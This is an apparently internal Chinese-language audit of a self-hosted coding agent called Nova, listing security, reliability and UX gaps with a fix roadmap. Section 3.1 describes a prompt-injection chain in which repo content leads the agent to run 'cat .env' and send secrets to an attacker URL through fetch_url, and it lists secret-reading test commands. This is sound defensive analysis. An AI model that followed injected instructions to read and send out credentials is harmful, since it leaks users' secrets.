# Nova Agent 待完善方案

> 更新（2026-10-30）：3.1 / 3.2 / 4.1–4.6 已落地；本文保留为原始审计记录，后续计划见《Nova Agent 下一阶段完善计划.md》。
>
> 日期：2026-10-30  
> 代码基线：`main` @ `d62746c`（工具系统正确性优化已合并）  
> 验证基线：后端 `482 passed / 7 skipped`；`ruff` 通过；前端构建与契约检查通过；服务器 E2E 5/5 通过  
> 对照对象：Claude Code、OpenAI Codex CLI、Cursor、Cline / Roo Code、Aider、OpenHands、Gemini CLI、GitHub Copilot coding agent（以其公开能力为参照）  
> 说明：本文基于代码阅读与一次真实服务端 E2E，不是渗透测试报告；涉及安全的结论均给出可复现的策略层证据。

---

## 0. 结论摘要

Nova 已经越过了“工具数量不够”的阶段。`edit_file` / `grep` / `glob` 补齐后，工具内核与主流编程 Agent 基本同层；真正拉开差距的是下面五件事：

1. **安全边界**：`readonly` / `ask` 只阻止了“写”，没有阻止“读密钥”；`fetch_url` 仍可在只读模式下外发内容。
2. **上下文治理**：长任务没有轮内压缩，工具结果会一路堆到上下文窗口。
3. **运行时可靠性**：停止生成时沙箱容器可能泄漏；工具串行执行；工具集不按模式/可用性裁剪。
4. **任务编排**：chat 级缺少计划/待办与子代理；多套任务引擎逻辑重叠。
5. **工具体验**：前端仍是通用 JSON 卡片，没有 diff/终端/流式输出/内联审批。

**不建议重写。** Nova 的差异化是“可验证交付 + 自托管多用户 + 确定性 Gate + 沙箱”，这些比单纯模仿 Claude Code 更有价值。下面的路线是增量补齐，不是推翻。

---

## 1. 与主流编程 Agent 的对照

### 1.1 能力矩阵

状态：✅ 对齐 / ◐ 部分 / ❌ 缺失

| 维度 | 主流做法 | Nova 现状 | 差距 | 优先级 |
|---|---|---|---|---|
| 精确编辑 | Claude Code `Edit(old→new)`、Codex `apply_patch`、Cline `replace_in_file` | ✅ `edit_file`（精确替换，复用审批/快照/测试保护） | 已补齐 | — |
| 精确搜索 | `Grep`（正则/glob）+ `Glob`（文件名） | ✅ `grep` / `glob`（文件系统直查，不依赖索引） | 已补齐 | — |
| 执行沙箱 | Codex 三档 sandbox；Claude Code 权限提示；OpenHands runtime 沙箱 | ✅ Docker：禁网/只读根/丢 caps/非 root/资源限额 | 隔离强于多数；缺只读工作区 | P0 |
| 权限审批 | 逐条 shell 审批、编辑 diff 审批、allowlist | ◐ 模式 + 能力策略；编辑有审批；shell 无逐条审批 | 缺命令审批队列 | P0/P1 |
| 上下文管理 | 轮内压缩、工具结果裁剪、摘要、prompt caching | ❌ 只估算，不治理 | 长任务会撞窗口 | P1 |
| 计划/待办 | Claude Code `TodoWrite`、Codex `update_plan` | ❌ chat 级没有；Tasks 工作流是另一套 | 长任务易漂移 | P1 |
| 子代理/并行 | Claude Code `Task` 子代理；只读工具并行 | ❌ 全串行，无子代理 | 多文件探索慢 | P1 |
| 代码理解 | 语义索引 + 符号图 + 增量索引 | ◐ 符号索引 + Qdrant/PG 混合检索；无增量；非 Python 用正则 | 大仓库时效/准确率 | P2 |
| 验证闭环 | lint/type/test/build、红绿、Reviewer | ✅ 红绿、Gate、Reviewer、交付报告、影响分析 | 强于多数 | — |
| Git 交付 | worktree/分支/PR/自动提交 | ◐ Git 面板、分支交付；ZIP 导入无 `.git`；worktree 未落 | ZIP 场景不可用 | P1 |
| 任务编排 | 单 Agent + 计划；或云端 issue→PR | ◐ tasks/changes/builder/night 多套引擎 | 逻辑重叠，维护成本 | P2 |
| 生态 | MCP、skills、hooks、插件 | ✅ MCP（stdio）、SKILL.md、hooks | MCP 传输/注解可扩展 | P2 |
| 模型接入 | Anthropic 原生、Gemini、OpenAI、缓存 | ◐ OpenAI-compatible + BYOK；无原生 Anthropic/缓存 | 成本/能力上限 | P2 |
| 可观测 | 工具指标、成本、评测集 | ◐ trace/audit/交付指标；无工具级指标 | 优化缺数据 | P2 |
| 部署/自托管 | 本地 CLI / 云端 / 企业部署 | ✅ 自托管、多用户隔离、BYOK、游客/配额 | 强于多数；构建/HTTPS 待完善 | P1/P2 |
| 前端工具体验 | diff/终端/内联审批/文件跳转/流式输出 | ◐ 通用 JSON 卡片；`edit_proposal` 有 diff | 用户可感知差距 | P2 |

### 1.2 Nova 已经超出主流的能力（不要丢）

- **引用真实性校验**：`文件:行号` 是否真实存在、行号是否越界；幻觉引用会被标出。
- **确定性交付报告**：命令/退出码/改动/未验证项/token/耗时，不靠模型自述。
- **红-绿真实复现**：先证明测试失败，再证明修复后通过。
- **只读 Reviewer**：独立审查 diff，输出 `pass/warn/block`。
- **变更影响雷达**：依赖图 + 符号引用 + 相关测试 + 风险等级。
- **项目大脑**：模块地图、入口点、热点、阅读顺序、依赖图。
- **Builder 0→1 + 契约优先全栈**：方案 → 文件提案 → 双栈 Gate → 审批写入。
- **夜间队列**：写入永远等早上人工批准。
- **多用户隔离 + BYOK + 配额**：自托管场景的稀缺能力。
- **本地执行器**：服务器对话、用户本机执行，带本机确认。
- **沙箱不降级**：Docker 不可用就如实标记，绝不在宿主机执行。

这些是 Nova 的产品壁垒。优化应该是“补短板”，不是把这些换成通用聊天能力。

---

## 2. 当前基线（已完成，不要重复做）

- 新工具：`edit_file`、`grep`、`glob`，已注册进 registry，前端有中文标签。
- 命令分级：`readonly` / `ask` 下只读命令放行，写操作/未知命令拒绝；`SHELL_READONLY_ALLOWLIST=false` 可回滚。
- 工具结果：合法 JSON + 头尾截断 + `_truncated`/`_hint`，执行类工具保留 stdout/stderr 尾部。
- `write_files` 超限明确报错，不再静默截断；`run_code` 仓库复制不完整会标记。
- 沙箱镜像内置 git（builder/sandbox 2.47.3、node 2.39.5），`git init/commit/diff` 实测通过。
- 服务端 E2E 5/5：readonly git 命令放行、ask `rm -rf` 拦截、`edit_file` 待审批→批准→落盘、`grep`/`glob` 正常。

---

## 3. P0：安全与正确性（建议先修）

### 3.1 只读模式能读密钥，`fetch_url` 能外发

**现象**

`readonly` / `ask` 只阻止写操作，没有阻止读密钥。策略层实测：

```text
readonly + run_command "cat .env"              -> allowed
readonly + run_command "sed -n '1,999p' .env"  -> allowed
readonly + run_command "grep -r SECRET ."      -> allowed
readonly + fetch_url "https://example.com"     -> allowed
```

**证据**

- `backend/app/core/security/policy.py:72-81` 的 `_path_values` 只检查 `path`/`prefix`/`requirements`/`files`，不解析 `command` 字符串。
- `backend/app/core/sandbox/runtime.py:232` 把仓库以 `:rw` 挂进沙箱；沙箱里的 `cat`/`sed`/`grep` 能读 `.env`。
- `backend/app/core/security/policy.py:135` 的 `fetch_url` 只检查 `ENABLE_FETCH_URL`，不按权限模式拦截；`net.fetch` 不在 `WRITE_CAPABILITIES` 里。
- `backend/app/core/security/redaction.py:6-25` 是正则脱敏（`sk-`、`AKIA`、JWT、私钥等），不是保密边界；数据库密码、自定义 token 可能不匹配。

**攻击链**

1. 仓库提交了 `.env`（很常见），或仓库内容/`AGENTS.md` 注入指令；
2. 模型调用 `run_command cat .env`；
3. 模型调用 `fetch_url https://attacker/?data=...`；
4. 仓库密钥/代码片段被外发。

沙箱没有网络，但 `fetch_url` 在 app 服务器上执行，有公网出口。

**建议修法（按强度排序）**

1. **策略层扫描 shell 路径**：对 `run_command` 用 `shlex` 拆 token，任何 token 经 `is_secret_path` 判断为密钥路径就拒绝；含 `$` 变量的 token 直接 fail-closed。补测试：`cat .env`、`sed -n ... .env`、`grep -r ... .env`、`cat $HOME/.env`。
2. **readonly/ask 用只读/净化工作区**：`run_command` 在这两个模式下挂 `:ro`，或先复制一份并排除 `is_secret_path` 文件再挂载。这样即使命令分类漏判，也改不了、读不到密钥。**这是把分类器从安全边界降级为 UX 层的关键。**
3. **`fetch_url` 在 readonly/ask 下拒绝或要求审批**；更好的是域名 allowlist + 出站代理；至少把 `ENABLE_FETCH_URL=false` 作为默认值，管理员显式打开。
4. 把仓库 `AGENTS.md`、工具输出、检索片段标记为**不可信内容**，不允许它们授权网络/写操作。

**验收**

- 策略测试覆盖上述命令与 `fetch_url` 模式；
- E2E：在临时仓库放一个 `.env`，readonly 下让模型读，必须被拒绝；
- 代码评审确认没有第二条 shell 路径能绕过。

**工作量/风险**：中；改策略 + 沙箱挂载方式，需回归 `run_command` 的 git/构建用例。

---

### 3.2 auto 模式写入文件后不会重建索引

**现象**

`ask` 模式批准修改会重建索引；`auto` 模式 `write_files`/`edit_file` 直接写入后，索引仍是旧的，但工具返回值写着“索引将自动重建”。

**证据**

- `backend/app/core/editing/service.py:127-128`：`create_edit` 写完文件就返回。
- `backend/app/core/tools/edit_file.py` / `write_files.py` 的 hint 声称“索引将自动重建”。
- 全仓 `enqueue_index` 只出现在 API/任务层：`api/v1/chat.py:239`（批准修改）、`repos.py`、`changes.py`、`tasks.py`、`builder.py`、`git_ops.py`；`core/tools` 与 `core/agent` 没有。
- E2E 走的是 ask→approve，所以没有暴露这个问题。

**影响**

auto 模式改完代码后，`search_code`/RAG 继续返回旧内容，模型可能引用旧行号；用户以为索引已更新。

**建议修法**

- `edit_file`/`write_files` 在 `staged=False` 后 `enqueue_index(repo_id, reindex=True, user_id=...)`；或在 chat loop 检测 applied edit 后入队。
- 补测试：mock `enqueue_index`，断言 auto 写入会调用、ask 暂存不会。
- 在自动重建不可用时，把 hint 改成“请手动重建索引”。

**验收**：auto 模式编辑后，`search_code` 能命中新内容；索引 Job 出现在队列。

**工作量/风险**：小；注意工具层导入 jobs 服务的循环依赖，优先在 loop 层入队。

---

### 3.3 公网入口需要确认 HTTPS

**现象**

compose 里 app 直接暴露 `0.0.0.0:8000`，caddy 是可选服务；部署脚本生成的 `.env` 是 `COOKIE_SECURE=false`。如果 8000 是公网入口，JWT、API Key、代码都在明文 HTTP 上走。

**建议**

- Caddy/Nginx + HTTPS，`COOKIE_SECURE=true`；
- app 只绑 `127.0.0.1`，由反代对外；
- 定期续期证书，HSTS。

**验收**：外部访问强制 HTTPS；cookie 带 `Secure`；HTTP 自动跳转。

**工作量/风险**：小；需要你确认线上实际入口（port 80 的 docker-proxy 是否就是反代）。

---

## 4. P1：Agent 质量与运行时可靠性

### 4.1 轮内上下文治理

**现象**：`loop.py` 把每个工具结果原样追加到 `messages`；`context_meter.py` 只做估算，不参与决策。

**影响**：12 轮 × 6k 字符工具结果 ≈ 72k 字符，加上历史/检索/摘要，容易接近或超过窗口；模型会报错或静默截断。

**建议**：加 `context_governor`，每次 LLM 调用前估算；超过窗口 75–80% 就压缩旧工具结果（保留头尾、丢中间），保留 system + 最近 N 轮 + 最近编辑/测试结果；必要时触发会话摘要。

**验收**：长任务（>12 轮）不超窗；压缩后仍能保留最近测试失败尾部；有指标记录压缩次数/节省 token。

### 4.2 停止生成时沙箱容器泄漏

**现象**：`sandbox/runtime.py:236` 用 `asyncio.to_thread(_run_docker, ...)`；客户端停止时 `CancelledError` 不会被 `except Exception` 捕获，`finally` 只清理临时目录，不 kill 容器。

**影响**：容器要等自己的超时才退出；2C2G 上多次操作会占内存/CPU。

**建议**：给容器打 `turn_id`/`session_id` label；捕获 `CancelledError` 后 `docker kill/rm -f`；或改用 `asyncio.create_subprocess_exec` 并在取消时 terminate。复用 `kill_job_containers`。

**验收**：停止生成后 5 秒内没有 `nova-sbx-*` 容器残留；有测试覆盖取消路径。

### 4.3 只读工具并行

**现象**：`loop.py:429` 串行执行 `for tc in tool_calls`。

**建议**：给 `ToolDefinition` 加 `parallel_safe`；同一 assistant message 里的只读工具（`read_file`/`grep`/`glob`/`list_files`/`search_code`/`impact_analysis`/`diagnose_error`）用 `asyncio.gather` 并发（上限 4）；写/执行仍串行；结果按原顺序回填。

**验收**：一轮 5 个只读调用总耗时显著下降；审计/SSE 顺序稳定；写操作不并发。

### 4.4 工具集按模式/可用性裁剪

**现象**：`get_registry().specs()` 始终下发全部 18 个工具 + MCP。readonly 仍告诉模型有 `write_files`；本机执行器未连接时仍下发 `local_run_command`，一调用空等 60 秒。

**建议**：`specs(mode=..., availability=...)`，按权限模式、沙箱/Builder 镜像、本地执行器状态裁剪；同时减少 prompt token。

**验收**：readonly 下不下发写/执行工具；本机未连接时不下发 `local_*`；模型无效调用次数下降。

### 4.5 ZIP 导入的仓库没有 Git

**现象**：E2E 里 `edit_file` 批准后返回 `commit: null`，因为上传的 ZIP 没有 `.git`；`auto_commit` 直接返回 None（`git_ops/service.py:144-155`）。

**建议**：ZIP 导入后自动 `git init` + baseline commit（app 运行时已装 git）；Git URL 导入保留原历史。

**验收**：ZIP 导入后 Git 面板可用；批准修改有 commit；回滚可用。

### 4.6 Provider 回退可能静默退化成“只会聊天”

**现象**：`fallback.py:31-50` 对没有原生 tool 支持的 provider 走基类默认实现，只吐 content；`FallbackLLM` 当成可用回答。目前所有 provider 都是 `OpenAICompatibleLLM`，概率低；但接一个忽略 tools 的兼容端点就会中招。

**建议**：provider 加 `supports_tools` 能力标记；coding 会话只回退到支持工具的 provider，否则明确报错。

**验收**：不支持工具的 provider 不会成为 coding 会话的 fallback；有测试。

### 4.7 工具输出流式与单工具取消

**现象**：`run_command` 可跑 300 秒，前端只显示“正在执行”；没有 stdout 流、没有单工具取消。

**建议**：SSE 增加 `tool_output` 分片事件；工具执行支持取消（按 `tool_call_id`）；前端显示实时输出与取消按钮。

**验收**：长命令能看到滚动输出；取消后容器被清理。

### 4.8 Chat 级计划/待办与子代理

**现象**：Tasks 工作流是另一套；chat 里没有 `update_plan`/todo。

**建议**：先加一个轻量 `update_plan` 工具 + 前端计划卡；子代理（独立上下文做探索/审查）作为后续可选能力，注意 token 成本。

**验收**：多步任务有可见计划；模型不漂移；计划可勾选。

---

## 5. P2：产品与工程层面的优化

### 5.1 前端工具体验

- `ToolCard.tsx` 仍是通用 JSON 卡片：没有 diff 渲染、终端 ANSI、实时耗时、复制/重试/取消、文件跳转。
- 没有对话内联审批（shell 命令审批、edit 审批都在别处）。
- 输入框占位符暗示 `@` 提及文件，但没找到实现。
- `TasksView.tsx` 1046 行、`SettingsView.tsx` 786 行、`LoginView.tsx` 721 行；bundle 767KB，有 chunk 警告。

**建议**：按工具做定制卡片（edit_file 显示 diff、run_command 显示终端、read_file 显示语法高亮）；加内联审批、文件跳转、单工具取消；做路由级 code-split。

### 5.2 任务编排统一

`tasks/engine.py`、`changes/executor.py`、`builder/engine.py`、`night/service.py` 各自维护 step/gate/重试逻辑。建议抽共享的 `TaskRun/Step/Gate` 抽象，否则每加一种任务都要改多套。

### 5.3 索引与检索

- 没有增量索引；改一个文件也全量重建。
- 非 Python 符号用正则，TS/Go/Java 的符号边界容易错；可考虑 tree-sitter。
- `search_code`/RAG 的时效性依赖重建索引，和 P0-3.2 是同一根因。

### 5.4 CI、部署、备份、观测

- 现在 `remote-deploy.py build` 在 2C2G 服务器上构建镜像；这次 app + sandbox 构建都花了数分钟。建议 GitHub Actions 构建并推 GHCR/ACR，服务器只 `docker compose pull`。
- 这次 E2E 抓到“沙箱镜像没装 git”这种单元测试抓不到的问题。建议加 fake-LLM 的确定性 E2E + 容器 smoke（`git --version`、pytest、网络/只读检查）。
- 生产备份目前只有代码 + `.env`；建议加 `pg_dump`、Qdrant snapshot、data volume 的定时备份。
- 工具级指标（成功率/p95/错误分类/token 成本）目前没有；加一个按工具聚合的面板。

### 5.5 模型接入

目前只有 OpenAI-compatible。建议补 Anthropic 原生 tool use + prompt caching、Gemini 原生工具、`parallel_tool_calls`/`tool_choice` 控制；长工具循环里 system + tools + 历史重复传输，缓存能显著降本降延迟。

### 5.6 MCP 生态

目前 stdio + allowlist。可扩展 streamable HTTP/SSE、OAuth、tool annotations（readOnly/destructive）、progress 通知；注意 MCP 进程沙箱与权限映射。

### 5.7 其他小项

- 工具 schema 缺 `strict`/`additionalProperties`/默认值；可减少参数错误。
- `context_meter` 是字符估算；可按 provider 的 tokenizer 精确化。
- 审计每次工具调用写一行；2C2G 上可考虑批量/异步。
- 会话/工具事件持久化体积：`stdout_tail`/`stderr_tail` 已持久化但前端未渲染，后续要么渲染要么缩小上限。

---

## 6. 建议路线图

### Phase A（1–2 周）：P0 安全与正确性
- 3.1 密钥读取/`fetch_url` 门禁 + readonly/ask 只读/净化工作区
- 3.2 auto 写入后重建索引
- 3.3 HTTPS/secure cookie（按线上入口确认）
- 验收：安全测试 + E2E；`482+` 测试保持绿。

### Phase B（2–3 周）：可靠性与延迟
- 4.1 上下文治理
- 4.2 沙箱取消清理
- 4.3 只读工具并行
- 4.4 工具集裁剪
- 验收：长任务不超窗、停止无残留容器、只读并发生效、无效工具调用下降。

### Phase C（2–3 周）：交付体验
- 4.5 ZIP 自动 Git
- 4.7 工具输出流式/取消
- 4.8 计划/待办
- 5.1 前端工具卡片/diff/终端/内联审批
- 验收：Git 面板开箱可用；前端能看到 diff 与实时输出；计划卡可见。

### Phase D（持续）：平台能力
- 5.2 任务编排统一
- 5.3 增量索引/tree-sitter
- 5.4 CI 预构建 + fake-LLM E2E + 备份 + 工具指标
- 5.5 原生 provider/prompt caching
- 5.6 MCP 生态

---

## 7. 验收与度量

**安全**
- `run_command` 密钥路径测试：`cat .env`、`sed ... .env`、`grep ... .env`、`cat $HOME/.env` 全部拒绝。
- `fetch_url` 在 readonly/ask 下拒绝或审批；公网域名 allowlist 生效。
- 停止生成后 `docker ps` 无 `nova-sbx-*` 残留。

**正确性**
- auto 模式编辑后 `search_code` 命中新内容；索引 Job 出现在队列。
- ZIP 导入后 Git 面板可用；批准修改有 commit。
- 长任务（>12 轮）不超窗；上下文压缩有指标。

**体验**
- 一轮 5 个只读工具并发；工具卡片显示 diff/终端；单工具可取消。
- 无效工具调用（被策略拒绝/工具不可用）比例下降。

**工程**
- `pytest` 全绿；`ruff` 干净；前端构建/契约检查通过。
- CI：容器 smoke + fake-LLM E2E；镜像预构建；部署时间下降。
- 备份：数据库/向量/数据卷可恢复演练一次。

---

## 8. 不建议做的事（YAGNI）

- **不重写**：现有证据化交付、Gate、Reviewer、沙箱、多用户隔离是壁垒。
- **不做多智能体自由对话表演**：编排应是确定性状态机；角色只是提示词与工具集分层。
- **不急着做 IDE 插件/实时补全**：先把闭环验收和全栈一致性做扎实。
- **不引入图数据库**：PostgreSQL + Qdrant 足够。
- **不做全自动部署**：部署必须人工批准 + 隔离预览 + 可回滚。
- **不盲目放开网络**：`fetch_url`/`install_deps` 的默认值应保守，按需开启。

---

## 9. 附录：关键文件索引

| 主题 | 文件 |
|---|---|
| 工具策略/能力 | `backend/app/core/security/policy.py` |
| 命令分级 | `backend/app/core/security/commands.py` |
| 沙箱运行时 | `backend/app/core/sandbox/runtime.py` |
| 工具注册 | `backend/app/core/tools/__init__.py` |
| 编辑/审批 | `backend/app/core/editing/service.py`、`backend/app/api/v1/chat.py` |
| Agent 循环 | `backend/app/core/agent/loop.py`、`context_meter.py`、`tool_output.py` |
| 检索/索引 | `backend/app/core/rag/`、`core/indexing/` |
| LLM 接入 | `backend/app/core/llm/factory.py`、`fallback.py` |
| 前端工具卡 | `frontend/src/components/ToolCard.tsx`、`Composer.tsx` |
| 任务/变更/Builder | `backend/app/core/tasks/`、`changes/`、`builder/` |
| 部署 | `deploy/remote-deploy.py`、`docker-compose.yml` |
